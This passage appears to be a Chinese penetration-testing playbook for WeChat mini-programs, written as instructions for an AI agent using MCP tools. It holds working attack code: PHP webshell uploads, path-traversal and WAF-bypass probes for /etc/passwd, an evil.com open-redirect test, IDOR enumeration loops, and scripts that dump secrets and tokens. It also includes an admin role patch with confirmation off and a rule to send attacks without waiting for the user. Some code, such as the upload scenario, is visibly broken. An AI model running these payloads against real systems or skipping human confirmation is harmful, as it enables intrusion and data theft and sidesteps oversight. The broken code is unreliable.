  → 命中 Webhook URL → 可向群聊发送任意消息

# 短信 / 邮件服务
debugger_ops(action="search_in_sources",
             query="sms.*(secret|key|token)|SMS_SECRET|SMS_KEY|email.*password|EMAIL_PASSWORD|smtp.*password|sendgrid|mailgun")

# 地图 / 推送 / 其他第三方
debugger_ops(action="search_in_sources",
             query="map.*key|MAP_KEY|push.*secret|PUSH_SECRET|gaode|amap|baidu.*map|tianyancha|shuidi")
```

#### 4.7.9 个人信息泄露检测（危害: MEDIUM）

```python
# 手机号
debugger_ops(action="search_in_sources",
             query="1[3-9]\\d{9}")

# 邮箱
debugger_ops(action="search_in_sources",
             query="[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}")

# 身份证号
debugger_ops(action="search_in_sources",
             query="\\d{17}[\\dXx]")

# IP 白名单
debugger_ops(action="search_in_sources",
             query="whitelist|white_list|ip_white|ipWhite|allowed_ips|ALLOWED_IPS")
```

#### 4.7.10 敏感信息聚合与报告

```
# 收集所有命中结果后，按以下格式输出：

┌─────────────────────────────────────────────────────────────┐
│                  敏感信息检测报告                              │
├─────────────────────────────────────────────────────────────┤
│ 危害等级     │ 类型          │ 命中数 │ 来源文件              │
├──────────────┼───────────────┼────────┼───────────────────────┤
│ 🔴 CRITICAL  │ 云服务 AK/SK   │ 3      │ app-service.js:1203  │
│ 🔴 CRITICAL  │ 微信 AppSecret │ 1      │ vendor.js:5821       │
│ 🔴 CRITICAL  │ 数据库连接串    │ 2      │ config.js:45         │
│ 🔴 CRITICAL  │ 支付商户密钥    │ 1      │ pay-utils.js:89      │
│ 🟠 HIGH      │ JWT Secret     │ 1      │ app.js:234           │
│ 🟠 HIGH      │ AES 加密密钥    │ 2      │ encrypt.js:67        │
│ 🟠 HIGH      │ RSA 私钥       │ 0      │ -                    │
│ 🟡 MEDIUM    │ 第三方 Token    │ 3      │ notify.js:12         │
│ 🟡 MEDIUM    │ 内网地址        │ 5      │ config.js:78         │
│ 🟡 MEDIUM    │ 手机号/邮箱     │ 8      │ user-profile.js:45   │
├──────────────┴───────────────┴────────┴───────────────────────┤
│ 🔴 需立即处置: 6 项 (CRITICAL)                                │
│ 🟠 需尽快处置: 3 项 (HIGH)                                    │
│ 🟡 建议整改: 16 项 (MEDIUM)                                   │
└─────────────────────────────────────────────────────────────┘

# 逐项详情格式：
# 危害等级: CRITICAL
# 类型: 腾讯云 SecretId
# 命中内容（脱敏）: AKID****a1b2 (32位)
# 来源文件: app-service.js 第 1203 行
# 上下文:
#   const tencentConfig = {
#     secretId: 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
#     secretKey: 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
#     bucket: 'myapp-1250000000',
#     region: 'ap-guangzhou'
#   };
# 风险: 攻击者可利用此 AK/SK 接管腾讯云 COS 存储桶，读取/删除/覆盖所有文件
# 建议: 1. 立即在腾讯云控制台禁用泄露的密钥
#        2. 使用临时密钥 (STS) 或服务端签名替代前端硬编码
#        3. 将 COS 上传改为通过业务后端代理
```

#### 4.7.11 敏感信息扫描的完整执行清单

```
□ 云服务 AK/SK: AKID / LTAI / AKIA / 七牛 / 又拍云 / 百度云 / 华为云 / 京东云
□ API 密钥: 微信 AppId/AppSecret / 支付宝密钥 / 开放平台 app_key / x-api-key
□ 支付密钥: mch_id / mch_key / partner_key / paySignKey
□ JWT/Session: jwt_secret / session_secret / cookie_secret
□ 签名加密: sign_key / encrypt_key / cipher_key
□ 数据库: jdbc / mongodb:// / mysql:// / redis:// / DB_PASSWORD / DATABASE_URL
□ 加密密钥: AES_KEY / DES_KEY / RSA 私钥 / 3DES_KEY
□ 内网地址: 10.x / 172.16-31.x / 192.168.x / dev/staging 域名
□ OSS/CDN: oss- / cos. / s3.amazonaws / aliyuncs / myqcloud
□ 第三方 Token: GitHub Token / 钉钉飞书 Webhook / 短信邮件密钥
□ 个人信息: 手机号 / 邮箱 / 身份证号
```

---

## Phase 5：Vuex State 检查（授权范围内）

```
# 检查 Vuex store（仅读取，不修改）
runtime_ops(action="inspect_vuex_store")
  → 返回 store.state 结构、mutations、actions

# 修改 state（默认 dryRun=true，需显式确认才执行）
runtime_ops(action="patch_vuex_state",
            vuex_path="user.role",
            vuex_value="admin",
            dry_run=True,
            require_confirm=False)

# 恢复快照（同样需 requireConfirm=true）
runtime_ops(action="restore_vuex_state", dry_run=True, require_confirm=False)
```

---

## Phase 6：报告导出

```
analysis_ops(action="generate_security_notes")
  → 生成完整 Markdown 安全评估笔记
    包含：路由清单 + 按路由分组的接口清单、认证分析、IDOR 候选、
          敏感数据暴露、支付接口、签名重放线索、待人工验证项

analysis_ops(action="generate_api_table_markdown")
  → 单独生成接口资产 Markdown 表格（按路由分组）

analysis_ops(action="export_session")
  → 导出完整评估会话 JSON 到 reports/ 目录
```

---

## MCP 工具完整索引

| 工具名 | action | 主要用途 |
|--------|--------|---------|
| `connection_ops` | `status` / `connect_wmpf` / `select_appservice_context` / `list_targets` / `switch_target` | CDP 连接与 target 管理 |
| `network_ops` | `hook_wx_request` / `hook_fetch_and_xhr` / `get_all_requests` / `get_request_detail` | 流量采集与 Hook 注入 |
| `network_ops` | `search_runtime_keywords` / `trace_request_callstack` / `inspect_wx_config` | 运行时关键词搜索 |
| `runtime_ops` | `dump_runtime_snapshot` / `runtime_eval` / `runtime_eval_appservice` | JS 执行、路由获取与快照 |
| `runtime_ops` | `inspect_vuex_store` / `patch_vuex_state` / `restore_vuex_state` | Vuex Store 检查（需授权）|
| `runtime_ops` | `list_interactive_elements` / `safe_click_and_observe` / `input_text_and_observe` | 页面交互（路由跳转触发）|
| `debugger_ops` | `list_scripts` / `get_script_source` / `search_in_sources` / `save_script_source` | 源码分析与逆向 |
| `debugger_ops` | `break_on_xhr` / `set_breakpoint_on_text` / `get_paused_info` / `step` / `resume_execution` | 动态调试与断点 |
| `debugger_ops` | `evaluate_script` / `get_websocket_messages` | 运行时求值和 WS 消息 |
| `analysis_ops` | `get_api_inventory` / `analyze_auth_surface` / `find_idor_candidates` | 接口资产与认证分析 |
| `analysis_ops` | `find_sign_related_requests` / `build_replay_plan` / `compare_two_requests` | 签名重放与请求对比 |
| `analysis_ops` | `passive_param_fuzz_suggestions` | 参数 Fuzz 建议生成 |
| `analysis_ops` | `generate_security_notes` / `generate_api_table_markdown` / `export_session` | 报告生成与导出 |
| `decrypt_ops` | `decode_payload` / `decrypt_payload` / `run_decrypt_pipeline` | 编码解码与多层解密 |
| `decrypt_ops` | `auto_detect_encoding` / `discover_runtime_crypto_functions` / `call_runtime_crypto_function` | 加密发现与动态调用 |
| `decrypt_ops` | `detect_ecb_pattern` | ECB 模式检测与块重排攻击 |
| `pentest_ops` | `start_pentest_scan` / `get_pentest_job` / `list_pentest_jobs` | 主动漏洞验证（授权环境）|
| `reverse_ops` | `match_reverse_cases` / `identify_crypto_pattern` / `detect_reverse_strategy` | 逆向分析辅助 |
| `replay_ops` | `start_auto_replay` / `get_replay_job` | 自动重放（写操作默认阻断）|

---

## 常见场景速查

### 场景 1：wx.request 未加密，全路由渗透评估

```
Phase 0 → hook_wx_request
→ Phase 1: 获取路由列表 → 逐路由触发操作 → get_all_requests（标注来源路由）
→ Phase 2: analyze_auth_surface + find_idor_candidates + find_payment_and_order_surfaces
          + find_sensitive_data_exposure + find_sign_related_requests
          + passive_param_fuzz_suggestions
→ Phase 6: generate_security_notes → export_session
```

### 场景 2：请求参数加密（AES-CBC，IV 拼在密文前）

```
# 1. 识别加密参数
auto_detect_encoding(value="<密文>")  # → base64

# 2. 从断点获取 key
break_on_xhr(url="/api/") → get_paused_info → evaluate_js("_aesKey")

# 3. 解密（IV 自动从密文前 16 字节提取）
decrypt_ops(action="decrypt_payload",
            value="<base64密文>",
            algorithm="aes",
            key="<提取的key>",
            mode="cbc",
            input_encoding="base64",
            key_encoding="utf-8")

# 4. 解密后对明文参数做渗透分析（走场景 1 流程）
```

### 场景 3：唯品会 mina_edata 三层解密

```
# 见 Phase 3.3 多层流水线示例
# VIP_TANK session token 获取：
evaluate_script("wx.getStorageSync('VIP_TANK') || globalThis.VIP_TANK")
```

### 场景 4：签名重放分析（全路由）

```
# 1. 在全量请求中找出所有签名接口
find_sign_related_requests()
  → 列出所有含 sign/timestamp/nonce 的请求（标注来源路由）

# 2. 对同一接口采集多次请求
# 在不同路由触发同一接口，对比 sign 值变化
compare_two_requests(request_id_a="<第1次>", request_id_b="<第2次>")

# 3. 判断签名绑定范围
build_replay_plan(request_id="<id>")
  → 检查: timestamp 窗口、nonce 是否一次性、签名是否绑定 body

# 4. 手动验证
# 将计划复制到 Burp Repeater 在授权环境中单次测试
```

### 场景 5：IDOR 候选验证（跨路由）

```
find_idor_candidates()
  → 列出含 orderId/userId/memberId 的接口（标注来源路由）

# 对每个候选接口：
compare_two_requests(request_id_a="<账号A请求>", request_id_b="<账号B请求>")
  → 对比两账号请求差异，验证服务端是否正确绑定账号

# 写操作 IDOR（危害更大）：
# PUT /api/users/<id> → 改他人资料
# DELETE /api/orders/<id> → 删他人订单
# POST /api/admin/approval → 越权审批
```

### 场景 6：动态密钥 Hook 追踪

```
# 方法 1：XHR 断点
break_on_xhr(url="/api/encrypt")
→ get_paused_info(include_scopes=True)
→ 在作用域中查找 key/iv 变量

# 方法 2：源码搜索 + 文本断点
search_in_sources(query="AES.encrypt|CryptoJS|createCipheriv|encryptData")
set_breakpoint_on_text(text="CryptoJS.AES.encrypt")
→ 触发断点 → evaluate_script("arguments[1]")  // 获取 key
```

### 场景 7：Webpack 打包逆向

```
# 1. 检测 Webpack
search_in_sources(query="webpackJsonp|__webpack_require__")

# 2. 定位加密模块
search_in_sources(query="encrypt|decrypt|generateSign")

# 3. 提取模块代码
get_script_source(url="<chunk URL>")

# 4. 搜索模块 ID 引用
search_in_sources(query="__webpack_require__\\(\\d+\\)")
  → 建立 moduleId → 功能 映射表
  → 找到加密函数的 moduleId → 提取该模块代码 → 本地分析
```

### 场景 8：JSVMP 虚拟机保护

```
# 1. 识别 JSVMP
search_in_sources(query="while.*true.*switch|for.*;;.*switch")
  → 命中 → JSVMP 确认

# 2. 路径选择
# 路径 A: Hook 出入口（推荐先试）
hook_wx_request → 对比加密前后参数
→ 如果能从 Hook 日志还原签名公式 → 纯算法还原

# 路径 B: 动态截取（路径 A 失败时）
# 在请求发送前截取最终签名值
runtime_eval("... hook wx.request ...")
→ 在 JSVMP 完成签名后、发送请求前截获
```

### 场景 9：ECB 块重排攻击

```
# 1. 检测 ECB 模式
detect_ecb_pattern(value="<base64密文>")
  → 密文存在重复 16 字节块 → ECB 确认

# 2. 分析明文结构
# ECB 模式下每个 16 字节块独立加密
# 如果明文是 JSON: {"role":"user","name":"attacker"}
# 可以通过重排密文块来构造 {"role":"admin","name":"attacker"}

# 3. 手动构造
# 将 "admin" 块替换到 "user" 块的位置
```

### 场景 10：响应解密 + 数据渗漏分析

```
# 1. 发现加密响应
get_request_detail(request_id="<id>")
  → response.body 是 base64 乱码 → 加密响应

# 2. 追踪解密函数
search_in_sources(query="decrypt|JSON.parse.*atob|decryptData|decryptResp")
→ 定位响应拦截器中的解密逻辑

# 3. Hook 解密函数
break_on_xhr(url="/api/") → step into → 观察解密过程

# 4. 提取解密后的明文数据做渗透分析
```

### 场景 11：源码敏感信息扫描

```
# 1. 列出所有脚本
list_scripts()

# 2. 批量运行敏感信息搜索（按危害等级排序）:
# CRITICAL — 云 AK/SK + 微信 AppSecret + 数据库凭据 + 支付密钥
# HIGH — JWT Secret + AES_KEY + RSA 私钥 + 签名密钥
# MEDIUM — 第三方 Token + 内网地址 + 手机号/邮箱

# 3. 逐项复核命中的结果
get_script_source(url="<命中脚本URL>")
  → 读取上下文确认是否为真实凭据（排除注释/测试数据/占位符）

# 4. 生成敏感信息报告（按 Phase 4.7.10 格式）

# 5. 将报告纳入 generate_security_notes
```

### 场景 12：路径参数 undefined IDOR

```
# 1. 识别路径含 /undefined 的请求
network_ops(action="get_all_requests")
  → 过滤: url.includes('/undefined') 或 path.includes('/undefined')

# 典型路径格式:
# /dtkjg_inspection/api/exhibit/getAppExhibitDetail/undefined
# /api/order/detail/undefined
# /user/profile/undefined/info

# 2. 获取原始请求详情
network_ops(action="get_request_detail", request_id="<id>")
  → 提取: url, method, headers, 认证 token

# 3. 替换 undefined 为数字 ID 并主动发送（优先用相邻已知 ID）
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var baseUrl='<含 /undefined 的完整URL>';
  var headers={'Content-Type':'application/json','Authorization':'Bearer <token>'};
  // 若已知某 exhibitId=42，则优先测试邻近范围
  var testIds=[1,2,3,10,40,41,42,43,44,100,1000,99999];
  var results=[];
  for(var id of testIds){
    var r=await fetch(baseUrl.replace('/undefined','/'+id),{method:'GET',headers:headers});
    var t=await r.text();
    results.push({id:id,status:r.status,len:t.length,preview:t.slice(0,400)});
  }
  return JSON.stringify(results,null,2);
})()")

# 4. 判断
# 不同 ID 返回不同数据          → IDOR 确认
# 返回他人敏感信息              → 严重，立即报告
# 所有 ID 均 403/404            → 有保护，记录为已防御
# undefined 失败但数字 ID 成功  → 重点测试：鉴权可能仅依赖参数存在性
```

---

### 场景 13：JWT / Token 暴露在 URL 查询参数中

```
# 1. 发现
# 在接口清单或 get_all_requests 中发现 token=eyJ... 出现在 URL query 而非 header
# 典型形式: /v2/checkParams?uid=xxx&token=eyJhbGciOiJIUzI1NiJ9.xxx.xxx&enc=xxx

# 2. 解码 JWT Payload（无需密钥）
# JWT 格式: header.payload.signature，payload 是 base64url 编码
runtime_ops(action="runtime_eval",
  expression="(()=>{
    var token='<完整JWT>';
    var parts=token.split('.');
    var pad=s=>s+('==='.slice(0,(4-s.length%4)%4));
    var decode=s=>JSON.parse(atob(pad(s.replace(/-/g,'+').replace(/_/g,'/'))));
    return JSON.stringify({header:decode(parts[0]),payload:decode(parts[1])},null,2);
  })()")
  → 提取: uid/userId/sub/fid/exp/iat 等字段
  → 检查 exp 是否已过期（iat + 86400 = exp）

# 3. 风险确认
# token 出现在 URL → 记录在 Nginx access log / CDN 日志 / Referer 头 → 信息泄露 MEDIUM
# token 仍有效（exp > 当前时间）→ 尝试用该 token 发送请求，确认可复用性
# 如果可复用：对 uid/sub 字段做 IDOR 测试（换 uid 看是否返回他人数据）

# 4. 独立记录为信息泄露发现（不与 IDOR 合并）
# 建议: 改为 Authorization 请求头传输
```

---

### 场景 14：cachedata 脚本——search_in_sources 失效时的运行时搜索

```
# 前提: list_scripts 显示脚本 URL 以 .cachedata 结尾
#        search_in_sources 所有查询均返回 0
#        get_script_source 报 "Debugger agent is not enabled"

# 1. 查找加密/签名函数（运行时函数名枚举）
runtime_ops(action="runtime_eval",
  expression="(()=>Object.keys(globalThis).filter(k=>
    typeof globalThis[k]==='function'&&
    /encrypt|decrypt|sign|md5|sha|aes|des|hmac|cipher|encode|getEnc/i.test(k)))()")
  → 命中函数名后，在下一次请求前 hook 该函数观察输入输出

# 2. 在运行时调用发现的加密函数（获取 enc 值）
decrypt_ops(action="discover_runtime_crypto_functions")
decrypt_ops(action="call_runtime_crypto_function",
            function_name="<发现的函数名>",
            args=["<uid>", "<fid>", "<token>"])
  → 如果成功 → 拿到 enc，可用于 IDOR 测试

# 3. 扫描全局变量中的硬编码密钥
runtime_ops(action="runtime_eval",
  expression="(()=>{var r={};for(var k of Object.keys(globalThis||window||{})){
    if(/host|gateway|secret|key|token|apiKey|appSecret/i.test(k)){
      try{var v=String(globalThis[k]);if(v&&v!='undefined'&&v.length<500)r[k]=v}catch(e){}
    }}return JSON.stringify(r)})()")

# 4. Storage 中的密钥扫描（补充）
runtime_ops(action="runtime_eval",
  expression="(()=>{try{var keys=wx.getStorageInfoSync().keys;var r={};
    keys.filter(k=>/key|token|secret|sign|iv|enc/i.test(k))
    .forEach(k=>{try{r[k]=wx.getStorageSync(k)}catch(e){}});return JSON.stringify(r)}
    catch(e){return String(e)}})()")
```

### 场景 15：多 appId——统一范围，按认证系分类测试

```
# 核心认知：同一会话中的多个 appId 都属于同一评估目标（同一产品线）
# 不需要分开评估，只需按认证体系分类后统一测试

# 1. 识别所有 appId
network_ops(action="get_all_requests")
  → 提取 Referer: servicewechat.com/{appId}/{version}/page-frame.html
  → 列出所有 appId，如:
  #   wx83e9ba48cb3bfcca  ← 当前 attached target（主入口）
  #   wx5636748e2379edc0  ← 相关小程序 A
  #   wxf19adc6d6fb00340  ← 相关小程序 B

# 2. 确认都属于同一产品（检查后端域名是否重叠）
# 快速验证：不同 appId 的请求是否打到相同 API 域名？
# 是 → 同一产品，全部在范围内
# 否 → 向委托方确认授权边界

# 3. 不按 appId 分桶，按认证机制分类建立接口清单
#    ┌─────────────────────────────────────────────────────┐
#    │  认证类型         │  代表接口                         │
#    │  Bearer JWT      │  /v2/userinfor/getWxByUids        │
#    │  Token+Sign      │  /yin/applet/clerk/...            │
#    │  Cookie          │  /api-zd-wap/booking/order/...   │
#    │  enc 参数        │  /wx/lecture/list                 │
#    └─────────────────────────────────────────────────────┘

# 4. 对每种认证类型执行 Phase 2 测试
#    → 认证绕过：用该认证类型的无效/空/伪造凭据测试
#    → IDOR：在同一 session 内用本人凭据测试其他用户 ID
#    → 跨认证系接口：检查是否存在用 A 系凭据访问 B 系接口的越权路径

# 5. 如需在嵌入小程序上下文中触发新请求（刷新 enc/token）
connection_ops(action="list_targets")
  → 查找对应 appId 的 CDP target（如果仍在线）
connection_ops(action="switch_target", target_id="<targetId>")
  → 切换后执行 select_appservice_context + hook_wx_request
  → 在用户操作下触发接口请求，捕获新的有效凭据
```

---

### 场景 16：认证机制迁移探测（传统登录 → OAuth2）

```
# 背景：小程序接口全部返回正常，但所有 /login 系列路径均 404

# 1. 执行 Phase 2.8 ① 批量探测
#    → 发现 /api/login / /api/auth/login 等全部返回 404
#    → 确认传统认证端点已下线

# 2. 探测 OAuth2 / SSO 端点
#    → /.well-known/openid-configuration 返回 200
#    → 提取 authorization_endpoint / token_endpoint / jwks_uri

# 3. 分析 OAuth2 安全性（主动测试）
runtime_ops(action="runtime_eval", expression="(async ()=>{
  // 测试1: redirect_uri 是否严格白名单
  var authUrl='<authorization_endpoint>?client_id=xxx&response_type=code'
    +'&redirect_uri=https://evil.com&scope=openid&state=test123';
  var r=await fetch(authUrl,{method:'GET',redirect:'manual'});
  // 302 到 evil.com → 🔴 redirect_uri 未严格校验
  return {status:r.status,location:r.headers.get('location')};
})()")

# 4. 检查 Storage 中是否残留旧 token（迁移不完整）
runtime_ops(action="runtime_eval",
  expression="(()=>{
    try{var keys=wx.getStorageInfoSync().keys;
      return keys.filter(k=>/token|auth|bearer|session/i.test(k))
        .map(k=>({k:k,v:String(wx.getStorageSync(k)).slice(0,100)}))
    }catch(e){return String(e)}})()")
# 有效旧 token → 说明迁移不完整，旧认证系统仍在服务

# 5. 版本差异检测（/v1/ 已修复但 /v2/ 未修复，或反向）
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var token='<有效token>';
  var versions=['v1','v2','v3'];
  var resources=['users','orders','admin'];
  var results=[];
  for(var v of versions){
    for(var res of resources){
      var r=await fetch('/api/'+v+'/'+res+'/1',{
        headers:{'Authorization':'Bearer '+token}});
      results.push({path:'/api/'+v+'/'+res+'/1',status:r.status});
    }
  }
  return JSON.stringify(results.filter(r=>r.status===200),null,2);
})()")
# v1 → 404（已下线），v2 → 200（仍存活）→ API 版本管理缺陷
```

---

### 场景 17：文件上传端点批量探测 + 漏洞验证

```
# 1. 执行 Phase 2.8 ② 探测，找到返回非 404 的上传端点

  → 与主动探测结果合并，确认真实上传端点列表

runtime_ops(action="runtime_eval", expression="(async ()=>{
  var token='<token>';
  var tests=[
    // 基线: 合法图片
    {label:'baseline_jpg', mime:'image/jpeg', filename:'test.jpg',
     body:'GIF89a'},
    // 测试1: .php 扩展名（黑名单测试）
    {label:'php_ext', mime:'application/octet-stream', filename:'shell.php',
     body:'<?php system($_GET[\"cmd\"]); ?>'},
    // 测试2: Content-Type 伪造（白名单测试）
    {label:'ct_spoof', mime:'image/gif', filename:'shell.php',
     body:'GIF89a<?php system($_GET[\"cmd\"]); ?>'},
    // 测试3: 双扩展名
    {label:'double_ext', mime:'image/gif', filename:'shell.php.gif',
     body:'GIF89a<?php system($_GET[\"cmd\"]); ?>'},
    // 测试4: .phar（PHP Phar 归档）
    {label:'phar_ext', mime:'image/gif', filename:'shell.phar',
     body:'GIF89a<?php system($_GET[\"cmd\"]); ?>'},
  ];
  var results=[];
  for(var t of tests){
    var fd=new FormData();
    fd.append('file',new Blob([t.body],{type:t.mime}),t.filename);
    var r=await fetch(url,{method:'POST',
      headers:{'Authorization':'Bearer '+token},body:fd});
    var resp=await r.text();
    // 提取上传后的文件路径
    var pathMatch=resp.match(/\/[^\s"']+\.(php|gif|jpg|phar)/i);
    results.push({label:t.label,status:r.status,
  }
  return JSON.stringify(results,null,2);
})()")

# 4. 访问上传的文件验证执行
# 返回 "uid=www-data" → 🔴 WebShell 执行成功（严重）
# 返回源码 → 目录禁止 PHP 执行

# 创建含 ../../var/www/html/shell.php 路径的 ZIP 并上传
```

---

### 场景 18：路径遍历 CVE 探针 + WAF 指纹识别

```
# 1. 执行 Phase 2.8 ③ 探针扫描，观察响应码矩阵

# 2. 响应码解读分支：
#
# 分支 A: 所有 ../变体均返回 404
#   → 可能已修补，也可能 WAF 统一返回 404 掩盖真实响应
#   → 对策: 尝试双重编码 %252e%252e%252f 绕过 WAF 的字符串匹配
#
# 分支 B: 某路径返回 418
#   → 商业 WAF 主动拦截（见 Phase 2.8 ③ WAF 指纹速查表）
#   → 读取响应头确认厂商，选择对应绕过策略
#
# 分支 C: /actuator/env 返回 200
#   → 🔴 Spring Actuator 未授权访问（无需路径穿越）
#   → 立即读取响应，提取 application.properties 中的凭据
#
# 分支 D: 某路径返回 200 + 文件内容
#   → 🔴 路径遍历漏洞确认
#   → 立即枚举高价值文件（见 Phase 4.7.5 数据库凭据 + .env）

# 3. WAF 绕过序列（418 时按顺序尝试）
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var bypasses=[
    {label:'double_encode',   path:'/%252e%252e/%252e%252e/etc/passwd'},
    {label:'path_param',      path:'/api;foo=bar/../../../etc/passwd'},
    {label:'semicolon',       path:'/api..;/../../../etc/passwd'},
    {label:'overlong_utf8',   path:'/%c0%af%c0%af%c0%af%c0%af%c0%aeetc%c0%afpasswd'},
    {label:'unicode_fullwidth',path:'/%uff0e%uff0e%u2215etc%u2215passwd'},
    {label:'null_byte',        path:'/../../../etc/passwd%00.png'},
  ];
  var results=[];
  for(var b of bypasses){
    var r=await fetch(b.path,{method:'GET'});
    results.push({label:b.label,status:r.status,
      preview:(await r.text()).slice(0,150)});
  }
  return JSON.stringify(results,null,2);
})()")
# status 200 + root:x:0:0 → 🔴 绕过成功，报告哪种编码绕过了 WAF

# 4. CSPT（Client-Side Path Traversal）检测
#    在已采集的 JS 请求中搜索 fetch/XHR 路径包含用户可控变量
network_ops(action="search_runtime_keywords",
  keywords=["location.pathname","location.hash","searchParams","URLSearchParams"])
  → 命中 → 检查该路径是否含 ../，可能构成 CSRF via CSPT
```

---

### 场景 19：REST 路由参数枚举 + 行为变化 IDOR

```
# 1. 执行 Phase 2.8 ④ 枚举，得到返回 200 的端点列表

# 2. 对每个 200 端点逐一分析
#    a. 对比 id=1 和 id=2 的响应数据差异
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var token='<token>';
  var url='/api/<资源>/<id>';
  var ids=[1,2,3,<当前用户ID>];
  var results=[];
  for(var id of ids){
    var r=await fetch(url.replace('<id>',id),{
      headers:{'Authorization':'Bearer '+token}});
    results.push({id:id,status:r.status,
      preview:(await r.text()).slice(0,400)});
  }
  return JSON.stringify(results,null,2);
})()")
# 不同 ID 返回不同 name/phone/idCard → 🔴 IDOR 确认 → 转 Phase 2.2

#    b. 检查 HTTP 方法枚举结果（见 Phase 2.8 ④ 方法枚举模板）
#       PUT 200 → 越权修改；DELETE 200 → 越权删除（高危）

#    c. 检查 /api/users/undefined（Phase 2.2.1）
network_ops(action="get_all_requests")
  → 过滤 url.includes('/undefined')
  → 若存在且 status=200 → undefined IDOR 测试

# 3. API 版本差异 IDOR（OWASP API9：资产管理不当）
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var token='<token>';
  var versions=['','v1','v2','v3'];
  var results=[];
  for(var v of versions){
    var prefix=v?'/api/'+v:'/api';
    var r=await fetch(prefix+'/users/1',{
      headers:{'Authorization':'Bearer '+token}});
    results.push({version:v||'无版本前缀',status:r.status,
      preview:r.status===200?(await r.text()).slice(0,200):''});
  }
  return JSON.stringify(results,null,2);
})()")
# v1→403（已修复）但 v2→200（未修复）→ 🔴 API 版本差异漏洞

# 4. 匿名访问测试（不带 token）
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var url='/api/<发现的存活资源>/1';
  var r=await fetch(url,{method:'GET'});  // 不带 Authorization
  return {status:r.status,preview:(await r.text()).slice(0,300)};
})()")
# 无 token 也返回 200 → 🔴 接口根本无认证保护（严重）
```

---

## 经验法则（48 条）

### 侦察与路由（1-7）
1. **先盘点路由，再捕流量**：第一步用 `getCurrentPages()` + `__wxConfig.page` 列出所有页面路径，再逐路由采集
2. **每个请求必须标注来源路由**：`dump_runtime_snapshot` 获取当前 route，所有 `get_all_requests` 结果按路由分组
3. **不要只测当前页面**：小程序通常有 10+ 个页面，每个页面都产生不同的接口流量。只测首页会遗漏 60%+ 的接口
4. **TabBar 页面手动切换**：用 `wx.switchTab` 切换 TabBar 页，非 TabBar 页用 `wx.navigateTo`；切回已加载的 Tab 不会重新请求，需调用 `onPullDownRefresh` 或 `onShow` 强制刷新
5. **路由参数影响接口**：同一页面不同 query 参数可能触发不同接口（如列表页的筛选条件），逐一测试
6. **子包/分包路由也需要遍历**：`__wxConfig.subpackages` 中的分包页面同样产生接口，不可跳过
7. **空流量路由最多重试 2 次即跳过**：导航后仍无新请求，先尝试 `onPullDownRefresh/onShow` + 导航典型子页面；若仍为空则判定为"静态/纯UI路由"，记录"[无接口 — 跳过]"后立即进入下一条路由，不要反复在同一路由上耗时

### 渗透测试（7-14）
7. **先盘点资产，再找加密**：摸清接口版图再针对性分析
8. **IDOR 不只看读操作**：PUT/DELETE/PATCH 的写越权危害大 10 倍，所有 HTTP 方法都要测
9. **响应对比不能只看状态码**：200 + 空数据、200 + 相同数据、500 内部报错都需要不同判断
10. **认证绕过检查 token 位置**：Header → Query → Body 都可能携带 token，逐一测试
11. **支付接口只生成计划不自动发送**：`build_replay_plan` 是安全的边界
12. **签名分析先收集多次请求**：对比 sign 值变化因子（timestamp 精度、nonce 一次性、body 绑定范围）
13. **敏感字段关注响应体**：手机号/身份证/银行卡/token 在响应中回显即高风险
14. **Fuzz 前先理解参数语义**：数字型/字符串型/枚举型/JSON 型的 Fuzz 策略完全不同

### 解密分析（15-22）
15. **加密参数先看编码**：`auto_detect_encoding` 一秒识别 base64/hex/url，不要猜
16. **3DES key 不足 24 字节**：CryptoJS 会自动零填充到 24 字节，解密时同步处理
17. **AES-CBC IV 常在密文前 16 字节**：不单独提供 iv 时流水线自动提取
18. **MD5-Key-Derive 是 vipshop 模式的核心**：base_secret + "&" + VIP_TANK → MD5 → AES key
19. **ECB 块重排是最被低估的攻击向量**：相同明文块产生相同密文块 → 可重排
20. **Padding Oracle 看错误差异**：500/padding error vs 200/data error → Oracle 存在
21. **VIP_TANK 从 Storage 获取**：`evaluate_script("wx.getStorageSync('VIP_TANK')")`
22. **响应加密比请求加密更隐蔽**：很多小程序只加密响应不解密请求，容易遗漏

### 逆向分析（23-27）
23. **先识别代码保护类型再选工具**：Webpack/OB混淆/JSVMP 三种类型处理方式完全不同
24. **Webpack 拆包先建立 moduleId 映射**：`__webpack_require__(N)` 的 N 是关键，建立映射后快速定位
25. **Hook 必须在请求发送前安装**：`hook_wx_request` 要在页面加载前注入，否则漏掉首屏请求
26. **JSVMP 不反编译，Hook 出入口**：遇到 VM 保护不要尝试反编译字节码，直接在 XHR/fetch 层面截取
27. **Storage 是小程序的密钥仓库**：`wx.getStorageSync` 中的 key/token/secret 字段是高频密钥来源

### 工具与流程（28-30）
28. **断点调试优先用 break_on_xhr**：比手动 set_breakpoint 更快定位签名/加密函数
29. **get_paused_info 的 include_scopes=True**：在断点处直接看 key/iv 变量值
30. **export_session 在评估结束时调用**：保存完整证据链，方便后续报告和复测

### 敏感信息检测（31-35）
31. **源码扫描是 Phase 4 的第一步不是最后一步**：先扫描所有脚本中的硬编码凭据，再深入逆向分析。AK/SK 泄露的修复成本远低于算法破解
32. **AK 格式是最好的搜索锚点，但不够**：腾讯云 `AKID`、阿里云 `LTAI`、AWS `AKIA` 是精准锚点，但 Webpack 压缩后的自定义 Gateway 配置（`accessKey:"xxx"`）**不会被 AKID/LTAI 匹配到**，必须加搜 `accessKey\s*[:"]` + `gateway` 配置结构
33. **search_in_sources 返回 0 不等于真的没有**：压缩代码可能因分词问题跳过匹配。搜索后必须执行二次验证：`__wxConfig` 探查 + 全局变量遍历 + 32 位 hex 串搜索 + 环境关键字搜索
34. **凭据泄露必须标记 CRITICAL**：前端源码中的 AK/SK/AppSecret/数据库连接串/支付密钥/RSA 私钥 这六类一旦确认，均按最高危害等级报告
35. **确定泄露后优先应急响应**：立即建议用户轮换密钥，不要继续执行后续渗透步骤延误处置窗口

### 主动测试（36-39）
36. **IDOR/认证绕过不能只看静态报告**：`find_idor_candidates` 和 `analyze_auth_surface` 只给线索，必须用 `runtime_eval` + `fetch` 主动发送修改后的请求。不用等用户手动去 Burp 验证
